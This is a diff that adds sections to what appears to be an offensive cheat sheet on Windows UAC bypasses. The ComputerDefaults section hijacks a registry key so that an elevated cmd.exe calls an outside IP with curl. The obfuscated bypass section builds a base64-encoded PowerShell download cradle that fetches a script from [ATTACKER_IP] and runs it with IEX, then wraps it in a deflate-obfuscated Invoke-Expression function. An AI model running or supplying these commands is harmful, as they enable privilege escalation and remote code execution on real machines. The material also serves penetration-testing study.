@@ -32,6 +32,62 @@ Link: https://github.com/CsEnox/EventViewer-UACBypass
 
      Invoke-EventViewer cmd.exe
 
+# ComputerDefaults
+
+### 1) 
+
+     New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
+
+### 2) 
+
+     New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
+
+### 3) 
+
+     Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe /c curl http://192.168.50.149/worked" -Force
+
+### 4) 
+
+     Start-Process "C:\Windows\System32\ComputerDefaults.exe"
+
+# Obfuscated UAC Bypass
+
+Link: https://github.com/I-Am-Jakoby/PowerShell-for-Hackers/blob/main/Functions/UAC-Bypass.md
+
+### 1) Prepare the command to be executed
+
+     $ipAddress = (ip addr show tun0 | grep inet | head -n 1 | cut -d ' ' -f 6 | cut -d '/' -f 1)
+     $text = "(New-Object System.Net.WebClient).DownloadString('http://$ipAddress/run3.txt') | IEX"
+     $bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
+     $EncodedText = [Convert]::ToBase64String($bytes)
+     $EncodedText
+     exit
+
+### 2) Encode your command
+
+     (New-Object System.Net.WebClient).DownloadString('http://[ATTACKER_IP]/run3.txt') | IEX
+     echo -en '(New-Object System.Net.WebClient).DownloadString("http://[ATTACKER_IP]/run3.txt") | IEX' | iconv -t UTF-16LE | base64 -w 0
+
+### 3) Insert the Base64 blob into the code variable 
+
+     # The result from the previous command
+     $code = "KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA3AC8AcgB1AG4AMwAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA="
+
+### 4) Create the Bypass function
+
+     function Bypass {
+     [CmdletBinding()]
+     param (
+     [Parameter (Position=0, Mandatory = $True)]
+     [string]$code )
+     
+     (nEw-OBJECt  Io.CoMpreSsion.DEflateSTrEaM( [SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( 'hY49C8IwGIT/ykvoGjs4FheLqIgfUHTKEpprK+SLJFL99zYFwUmXm+6ee4rzcbti3o0IcYDWCzxBfKSB+Mldctg98c0TLa1fXsZIHLalonUKxKqAnqRSxHaH+ioa16VRBohaT01EsXCmF03mirOHFa0zRlrFqFRUTM9Udv8QJvKIlO62j6J+hBvCvGYZzfK+c2o68AhZvWqSDIk3GvDEIy1nvIJGwk9J9l3f22mSdv') ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) | ForeacH{nEw-OBJECt Io.StReaMrEaDer( $_,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) | InVoKE-expREssION
+     }
+
+### 5) Execute the code
+
+     Bypass $code
+
 # GUI-BASED UAC BYPASS
 
 ## msconfig
